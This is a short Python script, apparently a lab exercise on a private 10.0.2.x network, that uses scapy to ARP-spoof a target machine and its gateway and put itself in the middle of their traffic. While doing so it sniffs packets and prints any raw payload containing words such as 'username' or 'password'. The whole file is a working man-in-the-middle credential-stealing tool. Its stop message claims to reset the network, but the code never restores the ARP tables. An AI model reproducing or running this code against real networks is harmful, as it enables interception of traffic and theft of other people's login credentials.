import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def process_packet(packet):
    # Agar packet mein HTTP request hai (Layer 7)
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        # Keywords check karna
        keywords = ["username", "user", "password", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                print(f"\n\n[!!!] Possible Credential Found: {load}\n")
                break

target_ip = "10.0.2.3"
gateway_ip = "10.0.2.2"

try:
    print("[*] MITM Active... Monitoring for credentials...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        # Sniffing only 1 packet at a time to keep the loop running
        scapy.sniff(iface="eth0", store=False, prn=process_packet, count=1)
except KeyboardInterrupt:
    print("\n[X] Stopping and Resetting...")
